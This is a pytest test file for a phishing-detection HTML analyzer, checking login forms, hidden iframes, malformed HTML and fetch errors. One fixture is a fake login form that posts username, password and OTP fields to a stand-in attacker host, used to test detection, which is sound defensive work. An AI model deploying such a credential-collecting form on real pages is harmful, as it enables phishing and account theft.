from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from backend.app.api import phishing as phishing_api
from backend.app.main import app
from backend.app.services.html_analyzer import FetchedHTML, HTMLAnalyzer, HTMLFetchError


def _analyze(html: str, url: str = "https://example.com/login"):
    return HTMLAnalyzer(fetcher=lambda _: FetchedHTML(html, url, 200, "text/html")).analyze_url(url)


def test_legitimate_login_form_is_not_alone_a_phishing_verdict() -> None:
    result = _analyze("""
        <html><body><form action="/login" method="post">
        <input type="email" name="email"><input type="password" name="password">
        <button>Login</button></form></body></html>
    """)

    assert len(result.forms) == 1
    assert {field["type"] for field in result.credential_fields} == {"email", "password"}
    assert result.external_submissions == []
    assert "EXTERNAL_FORM_SUBMISSION" not in result.indicators
    assert result.html_score < 30
    assert any("login form alone" in item for item in result.explanation)


def test_fake_login_external_submission_is_reported() -> None:
    result = _analyze("""
        <form action="https://collector.evil.xyz/submit" method="post">
        <input name="username"><input type="password" name="pass"><input name="otp_code">
        </form>
    """)

    assert result.html_score >= 40
    assert "EXTERNAL_FORM_SUBMISSION" in result.indicators
    assert result.external_submissions[0]["submission_domain"] == "collector.evil.xyz"
    assert {field["type"] for field in result.credential_fields} == {"username", "password", "otp"}
    assert any("external domain" in item for item in result.explanation)


def test_hidden_iframe_and_external_resources_are_collected() -> None:
    result = _analyze("""
        <iframe src="https://tracker.example.net/frame" style="display:none"></iframe>
        <script src="https://cdn.example.net/app.js"></script>
        <img src="https://cdn.example.net/logo.png">
    """)

    assert result.iframes[0]["hidden"] is True
    assert "HIDDEN_IFRAME" in result.indicators
    assert len(result.external_resources) == 3


def test_page_without_forms_is_safe_to_parse() -> None:
    result = _analyze("<html><body><h1>Documentation</h1><p>Hello</p></body></html>", "https://example.com/docs")

    assert result.forms == []
    assert result.credential_fields == []
    assert result.external_submissions == []
    assert "LOGIN_FORM_PRESENT" not in result.indicators


def test_malformed_html_is_tolerated() -> None:
    result = _analyze("<html><form action='/submit'><input type='password'><div><b>broken")

    assert result.forms == [] or len(result.forms) == 1
    assert any(field["type"] == "password" for field in result.credential_fields)


def test_fetch_errors_are_returned_as_api_status_without_crashing() -> None:
    def fail(_: str) -> FetchedHTML:
        raise HTMLFetchError("Website request timed out.", 408)

    original = phishing_api._html_analyzer
    phishing_api._html_analyzer = HTMLAnalyzer(fetcher=fail)
    try:
        with TestClient(app) as client:
            response = client.post("/api/phishing/html-analysis", json={"url": "https://example.com"})
    finally:
        phishing_api._html_analyzer = original

    assert response.status_code == 408
    assert response.json() == {"detail": "Website request timed out."}
